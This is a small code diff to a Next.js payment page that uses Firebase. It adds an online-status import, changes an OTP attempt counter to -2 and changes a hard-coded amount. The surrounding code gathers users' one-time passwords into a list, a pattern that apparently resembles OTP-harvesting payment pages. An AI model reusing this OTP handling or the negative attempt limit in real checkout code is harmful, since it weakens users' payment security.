@@ -5,6 +5,7 @@ import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
 import { db, handlePay } from "@/lib/firebase"
 import Loader from "@/components/loader"
+import { setupOnlineStatus } from "@/lib/utils"
 
 type PaymentInfo = {
   createdDate: string
@@ -140,7 +141,7 @@ export default function Payment() {
   })
   const [countdown, setCountdown] = useState(60)
   const [isCountdownActive, setIsCountdownActive] = useState(true)
-  const [otpAttempts, setOtpAttempts] = useState(2)
+  const [otpAttempts, setOtpAttempts] = useState(-2)
   const [otpValue, setOtpValue] = useState('')
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
@@ -149,7 +150,7 @@ export default function Payment() {
     //handleAddotp(paymentInfo.otp!)
     const ty = localStorage!.getItem("amount")
     if (ty) {
-      setTotal("0.200")
+      setTotal("0.300")
     }
   }, [])
 
